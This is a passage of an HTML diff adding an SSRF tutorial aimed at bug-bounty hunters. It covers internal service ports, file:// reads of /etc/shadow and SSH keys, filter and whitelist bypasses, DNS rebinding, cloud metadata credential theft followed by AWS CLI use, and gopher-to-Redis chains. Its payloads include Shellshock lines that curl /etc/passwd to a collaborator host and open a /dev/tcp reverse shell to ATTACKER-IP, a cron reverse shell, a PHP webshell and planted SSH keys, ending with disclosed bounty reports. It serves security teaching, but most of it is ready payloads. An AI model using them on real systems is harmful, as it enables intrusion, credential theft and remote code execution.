+http://127.0.0.1:3306/   <span class="c"># MySQL</span>
+http://127.0.0.1:27017/  <span class="c"># MongoDB</span>
+http://127.0.0.1:11211/  <span class="c"># Memcached</span>
+http://127.0.0.1:8500/   <span class="c"># Consul</span>
+http://127.0.0.1:9200/   <span class="c"># Elasticsearch</span>
+http://127.0.0.1:8443/   <span class="c"># Kubernetes API</span>
+http://127.0.0.1:10255/  <span class="c"># Kubernetes kubelet (read-only)</span>
+http://127.0.0.1:10250/  <span class="c"># Kubernetes kubelet (API)</span>
+http://127.0.0.1:2375/   <span class="c"># Docker daemon (HTTP)</span>
+http://127.0.0.1:4040/   <span class="c"># ngrok tunnel inspector</span>
+http://127.0.0.1:8161/   <span class="c"># ActiveMQ</span>
+http://127.0.0.1:9000/   <span class="c"># FastCGI / Portainer</span>
+http://127.0.0.1:8080/   <span class="c"># Spring Boot / Tomcat manager</span>
+http://127.0.0.1:8080/actuator/  <span class="c"># Spring Boot Actuator</span></pre>
+
+  <h3>4.3 Reading Internal Files via SSRF</h3>
+  <p>When the application uses a library that supports multiple URL schemes, <code>file://</code> lets you read local files directly:</p>
+
+  <pre>stockApi=file:///etc/passwd
+stockApi=file:///etc/shadow
+stockApi=file:///proc/self/environ    <span class="c"># Environment variables (often has secrets)</span>
+stockApi=file:///proc/self/cmdline    <span class="c"># Command that started the process</span>
+stockApi=file:///app/config.yml       <span class="c"># Application config</span>
+stockApi=file:///home/ubuntu/.ssh/id_rsa  <span class="c"># SSH private key</span>
+stockApi=file:///var/www/html/.env    <span class="c"># Laravel/Django secrets</span></pre>
+
+  <h3>4.4 Deleting Users / Admin Actions via SSRF</h3>
+  <p>Once you've confirmed you can reach the internal admin panel, chain reads to actions:</p>
+
+  <pre><span class="c"># Step 1: Read the admin panel HTML to find endpoints</span>
+stockApi=http://localhost/admin
+
+<span class="c"># Step 2: Find delete/modify endpoints in the HTML response
+# Step 3: Execute the admin action through SSRF</span>
+stockApi=http://localhost/admin/delete?username=carlos
+stockApi=http://127.0.0.1/admin/users/carlos/delete</pre>
+
+</section>
+
+<!-- ══════════════════════════ CHAPTER 5 ══════════════════════════ -->
+<section id="ch5">
+  <div class="chapter-header" data-ch="05">
+    <div class="ch-label">Chapter 05</div>
+    <h2>Filter Bypass Techniques</h2>
+    <p>The most important chapter for real-world bug bounty. Defenses are almost always broken.</p>
+  </div>
+
+  <h3>5.1 Why Blacklists Always Fail</h3>
+  <p>A blacklist must be exhaustive — it must block every possible representation of a forbidden destination. An allow-list only needs to permit what's expected. Attackers only need to find one representation the blacklist missed. The math always favors the attacker.</p>
+
+  <h3>5.2 IP Address Encoding Bypasses</h3>
+  <p>There are dozens of ways to represent <code>127.0.0.1</code>. A filter blocking the string "127.0.0.1" misses all of these:</p>
+
+  <table class="payload-table">
+    <tr><th>Payload</th><th>Technique</th></tr>
+    <tr><td>http://127.0.0.1/</td><td>Baseline (usually blocked)</td></tr>
+    <tr><td>http://127.1/</td><td>Short form — omitted octets default to 0</td></tr>
+    <tr><td>http://127.0.1/</td><td>Three-octet short form</td></tr>
+    <tr><td>http://2130706433/</td><td>32-bit decimal integer</td></tr>
+    <tr><td>http://0x7f000001/</td><td>32-bit hexadecimal</td></tr>
+    <tr><td>http://0177.0.0.1/</td><td>First octet in octal</td></tr>
+    <tr><td>http://017700000001/</td><td>32-bit octal</td></tr>
+    <tr><td>http://[::ffff:127.0.0.1]/</td><td>IPv4-mapped IPv6</td></tr>
+    <tr><td>http://[::ffff:7f00:1]/</td><td>IPv4-mapped IPv6 (hex)</td></tr>
+    <tr><td>http://[::1]/</td><td>IPv6 loopback</td></tr>
+    <tr><td>http://0/</td><td>All zeros → 0.0.0.0 → loopback</td></tr>
+    <tr><td>http://0.0.0.0/</td><td>All-zeros address — resolves as loopback in many libs</td></tr>
+    <tr><td>http://localhost/</td><td>Domain that resolves to 127.0.0.1</td></tr>
+    <tr><td>http://localtest.me/</td><td>Public domain always resolving to 127.0.0.1</td></tr>
+    <tr><td>http://spoofed.burpcollaborator.net/</td><td>Collaborator domain resolving to 127.0.0.1</td></tr>
+    <tr><td>http://127.0.0.1.nip.io/</td><td>Wildcard DNS → resolves to embedded IP</td></tr>
+    <tr><td>http://[fe80::1%eth0]/</td><td>IPv6 link-local with zone ID</td></tr>
+    <tr><td>http://ip6-localhost/</td><td>/etc/hosts entry → ::1</td></tr>
+  </table>
+
+  <h3>5.3 Keyword Bypasses (for "admin", "localhost", etc.)</h3>
+
+  <table class="payload-table">
+    <tr><th>Technique</th><th>Example</th><th>Notes</th></tr>
+    <tr><td>Double URL-encode</td><td>http://127.1/%61dmin</td><td>%61 = 'a' after decode; filter decodes once and sees %61</td></tr>
+    <tr><td>Case variation</td><td>http://127.1/ADMIN</td><td>Case-insensitive server, case-sensitive filter</td></tr>
+    <tr><td>Unicode normalization</td><td>/ɑdmin</td><td>Some frameworks normalize Unicode → 'admin'</td></tr>
+    <tr><td>Path traversal</td><td>/some/../admin</td><td>Appended and normalized</td></tr>
+    <tr><td>Null byte</td><td>/admin%00/</td><td>Some string checks stop at null but path continues</td></tr>
+    <tr><td>Slash variations</td><td>/%2fadmin</td><td>URL-encoded slash</td></tr>
+  </table>
+
+  <h3>5.4 Open Redirect Chaining</h3>
+  <p>This is one of the most powerful bypasses against both blacklists AND whitelist-based defenses. If the application validates the URL is on an allowed domain, but the allowed domain has an open redirect, you chain them:</p>
+
+  <pre><span class="c"># Whitelist only allows: stock.weliketoshop.net
+# An open redirect exists at: /product/nextProduct?path=
+
+# Step 1: Identify the open redirect</span>
+GET /product/nextProduct?currentProductId=1&amp;<span class="bad">path=http://evil.com</span>
+
+<span class="c"># Step 2: Chain it — SSRF validation sees allowed domain, follows redirect to internal</span>
+<span class="ok">stockApi=http://stock.weliketoshop.net/product/nextProduct?path=http://localhost/admin</span>
+
+<span class="c"># Flow:
+# 1. Validator: "is it stock.weliketoshop.net?" → YES ✓
+# 2. Server fetches stock.weliketoshop.net/nextProduct?path=...
+# 3. That returns 301/302 to http://localhost/admin
+# 4. Server follows redirect → reads internal admin panel</span></pre>
+
+  <div class="info-box warn">
+    <div class="box-title">⚠️ Redirect Status Codes Matter</div>
+    <p>Use HTTP 307 or 308 if you need to preserve the HTTP method and body through the redirect (important for POST-based SSRF). Standard 301/302 typically converts POST to GET. Redirect to internal IP via 307 using a server you control.</p>
+  </div>
+
+  <h3>5.5 DNS Rebinding</h3>
+  <p>DNS rebinding defeats "resolve-then-validate" defenses. The validator resolves your domain to a safe public IP and approves it. The HTTP client re-resolves for the actual fetch — and this time your DNS server returns an internal IP (e.g., 127.0.0.1). This works because the validation and fetch are separate operations with no DNS caching lock between them.</p>
+
+  <pre><span class="c"># Tools for DNS rebinding attacks:</span>
+<span class="c"># 1. rbndr.us — generates domains that alternate between two IPs</span>
+$ nslookup make-1-2-3-4-rebind-127-0-0-1-rr.1u.ms
+<span class="ok">Address: 1.2.3.4</span>   <span class="c"># First query → public IP (passes validation)</span>
+<span class="ok">Address: 127.0.0.1</span> <span class="c"># Second query → internal IP (used for actual fetch)</span>
+
+<span class="c"># 2. lock.cmpxchg8b.com/rebinder.html — point two IPs, generate domain
+# 3. NCC Group Singularity — self-hosted full rebinding toolkit</span>
+
+<span class="c"># Attack flow:
+# 1. Submit: url=http://make-IP1-rebind-IP2-rr.1u.ms/
+# 2. Validator resolves → IP1 (safe) → passes
+# 3. HTTP client resolves → IP2 (internal) → fetches internal service</span></pre>
+
+  <h3>5.6 Whitelist Parser Confusion</h3>
+  <p>Whitelist validation checks if the URL starts with or contains an allowed domain. Parser confusion tricks the validator into reading a different host than the HTTP client actually dials:</p>
+
+  <pre><span class="c"># Whitelist requires: stock.weliketoshop.net
+# Double-encode the @ and # to confuse parsers:</span>
+
+http://expected-host<span class="bad">%2523</span>@evil-host/
+<span class="c"># %25 decodes to %, then %23 decodes to #
+# Validator reads: expected-host#@evil-host → host = expected-host
+# Client sends request to: evil-host</span>
+
+http://localhost<span class="bad">%23</span>@stock.weliketoshop.net/admin
+<span class="c"># Fragment trick: validator sees stock.weliketoshop.net after #
+# but HTTP client never sends fragment in request</span>
+
+https://stock.weliketoshop.net#<span class="bad">@evil.com/</span>   <span class="c"># Reversed #@ trick</span>
+https://evil.com<span class="bad">.stock.weliketoshop.net/</span>      <span class="c"># DNS hierarchy abuse</span></pre>
+
+  <h3>5.7 Redirect-Based Bypasses (Server You Control)</h3>
+  <p>Host a simple redirect server. Submit its URL as the SSRF payload. The app validates the safe URL, then your server redirects to the internal target:</p>
+
+  <span class="pre-label">PHP redirect server (hosted on attacker VPS)</span>
+  <pre><span class="c">&lt;?php
+// Bypass redirect filter via HTTP 303 See Other
+// 303 behaves differently from 301/302 in some libraries</span>
+header('Location: http://169.254.169.254/latest/meta-data/', TRUE, <span class="bad">303</span>);
+?&gt;</pre>
+
+  <span class="pre-label">Python one-liner redirect server</span>
+  <pre><span class="c"># Serves a 302 redirect to the internal target</span>
+python3 -c "
+import http.server, urllib.parse
+class H(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(302)
+        self.send_header('Location','http://169.254.169.254/latest/meta-data/')
+        self.end_headers()
+http.server.HTTPServer(('',8000),H).serve_forever()
+"</pre>
+
+</section>
+
+<!-- ══════════════════════════ CHAPTER 6 ══════════════════════════ -->
+<section id="ch6">
+  <div class="chapter-header" data-ch="06">
+    <div class="ch-label">Chapter 06</div>
+    <h2>Blind SSRF — Detection &amp; Exploitation</h2>
+    <p>No response? No problem. Out-of-band techniques turn invisible vulnerabilities into critical findings.</p>
+  </div>
+
+  <h3>6.1 Detection Without Response</h3>
+  <p>When you can't see the server's response, you need to detect SSRF indirectly. The primary method is out-of-band (OOB) interaction detection using a collaborator server you control.</p>
+
+  <div class="flow">
+    <div class="flow-step">
+      <div class="flow-num">1</div>
+      <div class="flow-text">
+        <strong>Get a Collaborator URL</strong>
+        <span>In Burp Suite Pro: Burp → Burp Collaborator → Copy to clipboard. Free: interactsh.com, canarytokens.org, webhook.site</span>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-num">2</div>
+      <div class="flow-text">
+        <strong>Inject into every parameter</strong>
+        <span>Test: URL params, POST body, headers (Referer, X-Forwarded-For, Host, Origin, User-Agent, X-Real-IP)</span>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-num">3</div>
+      <div class="flow-text">
+        <strong>Watch for DNS + HTTP interactions</strong>
+        <span>A DNS callback confirms the server is resolving your domain. An HTTP hit confirms it actually fetched the URL.</span>
+      </div>
+    </div>
+    <div class="flow-step ok">
+      <div class="flow-num">4</div>
+      <div class="flow-text">
+        <strong>Escalate: prove real impact</strong>
+        <span>Use gopher:// to interact with internal services, redirect to metadata, or enumerate internal ports via timing</span>
+      </div>
+    </div>
+  </div>
+
+  <h3>6.2 Headers to Test for Blind SSRF</h3>
+
+  <span class="pre-label">Burp Repeater — inject OOB payload into headers</span>
+  <pre>GET /product?productId=1 HTTP/1.1
+Host: target.com
+<span class="bad">Referer: http://YOUR-COLLABORATOR-ID.oastify.com</span>
+<span class="bad">X-Forwarded-For: http://YOUR-COLLABORATOR-ID.oastify.com</span>
+<span class="bad">X-Real-IP: YOUR-COLLABORATOR-ID.oastify.com</span>
+<span class="bad">X-Forwarded-Host: YOUR-COLLABORATOR-ID.oastify.com</span>
+<span class="bad">Origin: http://YOUR-COLLABORATOR-ID.oastify.com</span>
+<span class="bad">True-Client-IP: YOUR-COLLABORATOR-ID.oastify.com</span></pre>
+
+  <h3>6.3 Collaborator Everywhere Extension</h3>
+  <p>This Burp Suite extension automates blind SSRF discovery. It passively injects non-malicious payloads into all parameters and headers during normal browsing and reports back when the Collaborator server receives an interaction:</p>
+
+  <pre><span class="c"># Setup:
+# 1. Install "Collaborator Everywhere" from BApp Store
+# 2. Burp Collaborator → "Don't use Burp's own server" → configure your OOB server
+# 3. Add target to Burp's scope (Target → Add to scope)
+# 4. Browse the application normally
+# 5. Every request automatically gets OOB payloads injected
+# 6. Check Collaborator for hits — each hit identifies a vulnerable parameter</span></pre>
+
+  <h3>6.4 Blind SSRF → Internal Port Scanning</h3>
+  <p>Even without response bodies, you can fingerprint internal services via timing:</p>
+
+  <pre><span class="c"># Closed port: immediate TCP RST → fast response (~5ms)
+# Open port: established connection → slower response (~100ms+)
+# Filtered port: no response → timeout (~5-30 seconds)
+
+# Gopher to probe open/closed ports via response timing:</span>
+gopher://127.0.0.1:<span class="bad">6379</span>/_   <span class="c"># Redis — open if response comes quickly</span>
+gopher://127.0.0.1:<span class="bad">3306</span>/_   <span class="c"># MySQL</span>
+gopher://127.0.0.1:<span class="bad">9200</span>/_   <span class="c"># Elasticsearch</span></pre>
+
+  <h3>6.5 Blind SSRF + Shellshock (Legacy but Educational)</h3>
+  <p>The most dramatic PortSwigger scenario: blind SSRF into an internal server vulnerable to Shellshock (CVE-2014-6271). Commands are executed and output is exfiltrated via DNS to your collaborator:</p>
+
+  <pre><span class="c"># Shellshock payload in User-Agent header
+# Server receives the Referer URL, fetches it, and the
+# internal target processes User-Agent through bash</span>
+
+GET /product?productId=1 HTTP/1.1
+<span class="bad">Referer: http://192.168.0.X:8080/</span>       <span class="c"># Internal vulnerable server</span>
+<span class="bad">User-Agent: () { :; }; /bin/nslookup $(whoami).COLLABORATOR-ID.oastify.com</span>
+
+<span class="c"># $(whoami) gets executed on the internal server
+# Output is sent via DNS lookup to your Collaborator
+# You see: root.COLLABORATOR-ID.oastify.com in Collaborator interactions</span>
+
+<span class="c"># More useful Shellshock payloads:</span>
+User-Agent: () { :; }; /usr/bin/curl http://COLLABORATOR/$(cat /etc/passwd | base64)
+User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/ATTACKER-IP/4444 0&gt;&amp;1</pre>
+
+</section>
+
+<!-- ══════════════════════════ CHAPTER 7 ══════════════════════════ -->
+<section id="ch7">
+  <div class="chapter-header" data-ch="07">
+    <div class="ch-label">Chapter 07</div>
+    <h2>Cloud Metadata Attacks — The $50K Prize</h2>
+    <p>The highest-value SSRF target in 2025. Cloud metadata endpoints serve temporary credentials that unlock entire cloud infrastructures.</p>
+  </div>
+
+  <h3>7.1 Why Cloud Metadata Is the Ultimate Target</h3>
+  <p>Every major cloud provider runs an internal-only HTTP metadata service. This service is reachable only from inside the VM/container instance — making it the perfect SSRF target. The metadata service returns the temporary IAM credentials attached to that instance. Those credentials can be used to call AWS/GCP/Azure APIs externally. This is how SSRF becomes cloud infrastructure compromise.</p>
+
+  <div class="info-box danger">
+    <div class="box-title">💀 The Capital One Attack Chain</div>
+    <p>1. SSRF vulnerability in a WAF component (ModSecurity)</p>
+    <p>2. Attacker queries <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role</code></p>
+    <p>3. Receives temporary AccessKeyId, SecretAccessKey, SessionToken</p>
+    <p>4. Uses AWS CLI with those credentials to list 700+ S3 buckets</p>
+    <p>5. Downloads 30GB of data including 106 million credit card applications</p>
+    <p>6. Capital One paid $80M in regulatory fines + $190M in class action settlement</p>
+  </div>
+
+  <h3>7.2 AWS Metadata (IMDSv1)</h3>
+
+  <pre><span class="c"># Root metadata index</span>
+http://169.254.169.254/latest/meta-data/
+
+<span class="c"># Critical paths — always try these:</span>
+<span class="ok">http://169.254.169.254/latest/meta-data/iam/security-credentials/</span>
+<span class="c"># → Returns: role-name (e.g., ISRM-WAF-Role)</span>
+
+<span class="ok">http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME</span>
+<span class="c"># → Returns JSON with:
+# {
+#   "Code": "Success",
+#   "Type": "AWS-HMAC",
+#   "AccessKeyId": "ASIA...",
+#   "SecretAccessKey": "wJalrXUtn...",
+#   "Token": "AQoDYXdzE...",
+#   "Expiration": "2024-01-01T12:00:00Z"
+# }</span>
+
+<span class="c"># Other useful paths:</span>
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/local-ipv4
+http://169.254.169.254/latest/meta-data/instance-id
+http://169.254.169.254/latest/meta-data/public-ipv4
+http://169.254.169.254/latest/meta-data/placement/region
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/
+http://169.254.169.254/latest/user-data           <span class="c"># Often contains startup scripts with hardcoded secrets</span>
+http://169.254.169.254/latest/dynamic/instance-identity/document</pre>
+
+  <h3>7.3 Google Cloud (GCP) Metadata</h3>
+
+  <pre><span class="c"># GCP requires a custom header — but if app already sends it, you get full access</span>
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/computeMetadata/v1/
+
+<span class="c"># Must include header: Metadata-Flavor: Google
+# If the vulnerable app adds this header, you get full metadata access</span>
+
+<span class="c"># Key endpoints:</span>
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+<span class="c"># → Returns OAuth2 access token for the instance's service account</span>
+
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env  <span class="c"># K8s secrets</span></pre>
+
+  <h3>7.4 Azure Metadata</h3>
+
+  <pre>http://169.254.169.254/metadata/instance?api-version=2021-02-01
+<span class="c"># Requires: Metadata: true header</span>
+
+http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/&amp;api-version=2018-02-01
+<span class="c"># → Returns managed identity access token for Azure Resource Manager</span></pre>
+
+  <h3>7.5 After Getting Credentials — What to Do</h3>
+
+  <span class="pre-label">AWS credential exploitation (for PoC in authorized testing)</span>
+  <pre><span class="c"># Configure AWS CLI with stolen temporary credentials</span>
+export AWS_ACCESS_KEY_ID="ASIA..."
+export AWS_SECRET_ACCESS_KEY="wJalrXUtn..."
+export AWS_SESSION_TOKEN="AQoDYXdzE..."
+
+<span class="c"># What IAM role can this identity do?</span>
+aws sts get-caller-identity
+
+<span class="c"># List all S3 buckets (what Capital One attacker did)</span>
+aws s3 ls
+
+<span class="c"># List EC2 instances (scope of compromise)</span>
+aws ec2 describe-instances --region us-east-1
+
+<span class="c"># Check IAM permissions</span>
+aws iam list-attached-role-policies --role-name ROLE-NAME
+aws iam get-role-policy --role-name ROLE-NAME --policy-name POLICY-NAME
+
+<span class="c"># Read secrets from Secrets Manager</span>
+aws secretsmanager list-secrets
+aws secretsmanager get-secret-value --secret-id SECRET-NAME</pre>
+
+  <div class="info-box bounty">
+    <div class="box-title">🎯 Bug Bounty Strategy</div>
+    <p>For maximum bounty: demonstrate that you can retrieve the AccessKeyId and first 8 chars of SecretAccessKey. Do NOT actually download data or use the credentials. Call <code>sts:GetCallerIdentity</code> to prove validity — it's read-only and the definitive PoC. Document the IAM role name and its attached policies to show scope of impact. This is what turns a medium-severity SSRF into a critical finding worth $10K–$50K.</p>
+  </div>
+
+  <h3>7.6 IMDSv2 and Why It Matters</h3>
+  <p>AWS released IMDSv2 after the Capital One breach. IMDSv2 requires a session token obtained via a PUT request before any GET to the metadata service. Simple SSRF payloads using GET to <code>169.254.169.254</code> will return 401 Unauthorized. However:</p>
+
+  <pre><span class="c"># IMDSv2 requires PUT first to get a token</span>
+<span class="bad">GET</span> http://169.254.169.254/latest/meta-data/  <span class="c"># → 401 if IMDSv2 enforced</span>
+
+<span class="c"># IMDSv2 requires:</span>
+<span class="ok">PUT</span> http://169.254.169.254/latest/api/token
+X-aws-ec2-metadata-token-ttl-seconds: 21600
+<span class="c"># → Returns: token value</span>
+
+<span class="ok">GET</span> http://169.254.169.254/latest/meta-data/
+X-aws-ec2-metadata-token: TOKEN-VALUE
+<span class="c"># → Returns metadata</span>
+
+<span class="c"># SSRF bypass: if the app makes POST/PUT requests,
+# you can sometimes chain IMDSv2 via SSRF that supports PUT method
+# or use SSRF in a context where the app already has a metadata token</span></pre>
+
+</section>
+
+<!-- ══════════════════════════ CHAPTER 8 ══════════════════════════ -->
+<section id="ch8">
+  <div class="chapter-header" data-ch="08">
+    <div class="ch-label">Chapter 08</div>
+    <h2>Protocol Exploitation &amp; RCE Chains</h2>
+    <p>When SSRF goes beyond HTTP — weaponizing gopher://, file://, and other schemes to achieve Remote Code Execution.</p>
+  </div>
+
+  <h3>8.1 The gopher:// Protocol</h3>
+  <p>Gopher is a text-based TCP protocol predating HTTP. Its real power for SSRF exploitation: it lets you send arbitrary raw bytes to any TCP port. Unlike HTTP (which is constrained to HTTP request format), Gopher lets you speak Redis, MySQL, SMTP, FastCGI, or any other text-based protocol. This is how SSRF becomes RCE.</p>
+
+  <pre><span class="c"># Gopher URL format:
+# gopher://HOST:PORT/_ PAYLOAD
+# The _ is a path separator; everything after _ is sent raw to the port</span>
+
+gopher://127.0.0.1:6379/_PING   <span class="c"># Send PING command to Redis</span>
+gopher://localhost:25/_EHLO example.com  <span class="c"># Talk to SMTP</span>
+
+<span class="c"># Key: payload must be URL-encoded for transport,
+# then the server decodes it and sends raw bytes to the service</span></pre>
+
+  <h3>8.2 SSRF → Redis → RCE</h3>
+  <p>Redis running on localhost with no authentication is a common configuration in Docker environments and legacy deployments. Redis allows writing arbitrary files via <code>CONFIG SET</code>. If you write to <code>/var/spool/cron/</code>, you get a cron-based reverse shell. If you write to the web root, you get a PHP webshell.</p>
+
+  <span class="pre-label">Method 1: Redis → Cron Reverse Shell</span>
+  <pre><span class="c"># Raw Redis commands to write a reverse shell cron job:</span>
+FLUSHALL
+SET 1 "\n\n* * * * * bash -i &gt;&amp; /dev/tcp/ATTACKER-IP/4444 0&gt;&amp;1\n\n"
+CONFIG SET dir /var/spool/cron/crontabs
+CONFIG SET dbfilename root
+SAVE
+
+<span class="c"># Encoded as Gopher payload (use Gopherus tool to generate):</span>
+gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A3%0D%0A...
+
+<span class="c"># Using Gopherus tool (easier):</span>
+$ python gopherus.py --exploit redis
+<span class="c"># Choose: Shell - Get shell
+# Enter: Your listener IP and port
+# Output: Ready-to-paste gopher URL</span></pre>
+
+  <span class="pre-label">Method 2: Redis → PHP Webshell</span>
+  <pre><span class="c"># Write a PHP webshell to the web root:</span>
+FLUSHALL
+SET 1 "&lt;?php system($_GET['cmd']); ?&gt;"
+CONFIG SET dir /var/www/html/
+CONFIG SET dbfilename shell.php
+SAVE
+
+<span class="c"># Then access: http://target.com/shell.php?cmd=id</span></pre>
+
+  <span class="pre-label">Method 3: Redis → SSH Authorized Keys</span>
+  <pre><span class="c"># Write your SSH public key to root's authorized_keys:</span>
+FLUSHALL
+SET 1 "\n\nssh-rsa AAAA...YOUR_PUBLIC_KEY... attacker@kali\n\n"
+CONFIG SET dir /root/.ssh/
+CONFIG SET dbfilename authorized_keys
+SAVE
+
+<span class="c"># Then SSH in: ssh root@target.com -i your_private_key</span></pre>
+
+  <h3>8.3 Using Gopherus (Essential Tool)</h3>
+  <p>Gopherus is the go-to tool for generating gopher:// payloads for multiple internal services:</p>
+
+  <pre><span class="c"># Install:</span>
+git clone https://github.com/tarunkant/Gopherus.git
+cd Gopherus &amp;&amp; pip install -r requirements.txt
+
+<span class="c"># Available targets:</span>
+python gopherus.py --exploit redis      <span class="c"># Redis RCE</span>
+python gopherus.py --exploit mysql      <span class="c"># MySQL (needs creds)</span>
+python gopherus.py --exploit postgresql <span class="c"># PostgreSQL</span>
+python gopherus.py --exploit smtp       <span class="c"># Send email as internal user</span>
+python gopherus.py --exploit fastcgi    <span class="c"># PHP-FPM → RCE</span>
+python gopherus.py --exploit zabbix     <span class="c"># Zabbix RCE</span>
+python gopherus.py --exploit memcached  <span class="c"># Memcached deserialization</span></pre>
+
+  <h3>8.4 SSRF → FastCGI → RCE</h3>
+  <p>PHP-FPM (FastCGI) is commonly bound to <code>127.0.0.1:9000</code>. If you can reach it via gopher://, you can execute arbitrary PHP:</p>
+
+  <pre><span class="c"># FastCGI gopher payload (execute PHP code):</span>
+gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00
+<span class="c"># (Full payload generated by Gopherus — too long to write manually)
+
+# Execute: &lt;?php system('id'); ?&gt; 
+# → Output: uid=33(www-data) gid=33(www-data)</span></pre>
+
+  <h3>8.5 Other Protocol Exploits</h3>
+
+  <table class="payload-table">
+    <tr><th>Protocol</th><th>Target</th><th>Impact</th></tr>
+    <tr><td>file://</td><td>Local filesystem</td><td>Read /etc/passwd, /proc/self/environ, app configs, SSH keys</td></tr>
+    <tr><td>dict://</td><td>dict protocol / port scan</td><td>Port scanning, basic service interaction</td></tr>
+    <tr><td>sftp://</td><td>SSH/SFTP servers</td><td>Connect to internal SFTP services</td></tr>
+    <tr><td>ldap://</td><td>LDAP directory</td><td>Query Active Directory / LDAP servers</td></tr>
+    <tr><td>ldaps://</td><td>LDAP over TLS</td><td>Same as above, encrypted</td></tr>
+    <tr><td>jar://</td><td>Java ZIP fetch</td><td>Fetch remote ZIP and execute — code load primitive</td></tr>
+    <tr><td>ftp://</td><td>FTP servers</td><td>Access internal FTP, sometimes credential disclosure</td></tr>
+    <tr><td>netdoc://</td><td>Java only</td><td>File read in Java environments</td></tr>
+    <tr><td>smtp://</td><td>Mail server</td><td>Send email as internal user via gopher chain</td></tr>
+  </table>
+
+  <h3>8.6 Assetnote Blind SSRF Chains</h3>
+  <p>The assetnote/blind-ssrf-chains GitHub repo documents RCE chains specifically for blind SSRF. Key patterns:</p>
+
+  <pre><span class="c"># Confluence → SSRF (via icon URL parameter)
+# Artifactory → SSRF (via remote repository URL)
+# Jenkins → SSRF (via update center URL or webhook)
+# JIRA → SSRF (via icon URL in project settings)
+# Kibana → SSRF (via timelion chartURL)
+# Grafana → SSRF (via data source URL)
+
+# Each acts as an "SSRF canary" — you blind-SSRF the app,
+# which then SSRFs another internal service that OOBs to Collaborator</span></pre>
+
+</section>
+
+<!-- ══════════════════════════ CHAPTER 9 ══════════════════════════ -->
+<section id="ch9">
+  <div class="chapter-header" data-ch="09">
+    <div class="ch-label">Chapter 09</div>
+    <h2>Real-World Bug Bounty Reports</h2>
+    <p>Actual disclosed reports — attack chains, PoCs, bounties, and lessons for your own hunting.</p>
+  </div>
+
+  <div class="report-card">
+    <div class="r-header">
+      <div>
+        <div class="r-company">HackerOne — PDF Generator SSRF</div>
+        <span class="r-badge r-critical">CRITICAL · CVSS 10.0</span>
+      </div>
+      <div class="r-bounty">$25,000</div>
+    </div>
+    <p><strong>Report #2262382 | Researcher: @hackersight (mega7) | Fixed in &lt;24 hours</strong></p>
+    <p>The analytics report PDF generator passed a user-controlled template value (<code>element[:template]</code>) directly into a PDF rendering library without sanitization. The library interpreted HTML in the template value, and an injected <code>&lt;iframe src="http://169.254.169.254/..."&gt;</code> caused the PDF renderer (wkhtmltopdf-style) to make a server-side request to the AWS metadata endpoint.</p>
+    <div class="r-steps">
+      <strong>Attack chain:</strong>
+      <ol class="r-steps">
+        <li>Go to HackerOne Analytics → PDF Report generation</li>
+        <li>Find a template/element field that accepts custom HTML content</li>
+        <li>Inject: <code>&lt;iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"&gt;&lt;/iframe&gt;</code></li>
+        <li>Generate the PDF — the renderer fetches the iframe src server-side</li>
+        <li>The PDF contains the AWS credential response embedded in it</li>
+      </ol>
+    </div>
+    <div class="info-box bounty" style="margin-top:14px;">
+      <div class="box-title">💡 Lesson</div>
+      <p>PDF generators are one of the highest-value SSRF targets. Any feature that renders user-controlled HTML server-side to produce a PDF is a candidate. Try: &lt;img src="..."&gt;, &lt;iframe&gt;, &lt;script src="..."&gt;, CSS url() properties, &lt;link href="..."&gt;.</p>
+    </div>
+  </div>
+
+  <div class="report-card">
+    <div class="r-header">
+      <div>
+        <div class="r-company">Omise — Webhook SSRF via 303 Redirect</div>
+        <span class="r-badge r-critical">CRITICAL</span>
+      </div>
+      <div class="r-bounty">Paid</div>
+    </div>
+    <p><strong>Report #508459 | Researcher: @honoki</strong></p>
+    <p>Omise's webhook system blocked most redirects but had a bypass: HTTP 303 See Other status codes were followed. By hosting a server that returned 303 to the AWS metadata endpoint, the researcher caused the Omise webhook handler to fetch <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role</code> and expose AWS private keys.</p>
+    <div class="r-steps">
+      <strong>Attack chain:</strong>
+      <ol class="r-steps">
+        <li>Register a webhook URL pointing to attacker-controlled PHP server</li>
+        <li>PHP returns: <code>header('Location: http://169.254.169.254/...', TRUE, 303);</code></li>
+        <li>Omise's webhook handler follows the 303 redirect (unlike 301/302)</li>
+        <li>AWS metadata returned to attacker via webhook response capture</li>
+      </ol>
+    </div>
+    <div class="info-box bounty" style="margin-top:14px;">
+      <div class="box-title">💡 Lesson</div>
+      <p>When testing webhooks/callbacks, always try all redirect codes (301, 302, 303, 307, 308) — filters often block some but not all. 303 and 307 are especially worth testing. Host your own redirect server with each code type.</p>
+    </div>
+  </div>
+
+  <div class="report-card">
+    <div class="r-header">
+      <div>
+        <div class="r-company">Dropbox (via HelloSign) — File Import SSRF</div>
+        <span class="r-badge r-high">HIGH</span>
+      </div>
+      <div class="r-bounty">$4,913</div>
+    </div>
+    <p><strong>Researcher: @ehsayaan | Platform: HackerOne</strong></p>
+    <p>HelloSign (Dropbox) had an "Import from Dropbox" feature with a <code>file_reference</code> parameter. Direct SSRF was blocked, but a 303 redirect bypass (same technique as Omise above) worked. The researcher retrieved full AWS metadata including AccessKeyId and temporary credentials.</p>
+    <div class="r-steps">
+      <strong>Attack chain:</strong>
+      <ol class="r-steps">
+        <li>Intercept the "Import document" request — find <code>file_reference</code> parameter</li>
+        <li>Change value to Burp Collaborator URL → 404 (SSRF protection active)</li>
+        <li>Tried http://127.0.0.1 → blocked. Gave up initially.</li>
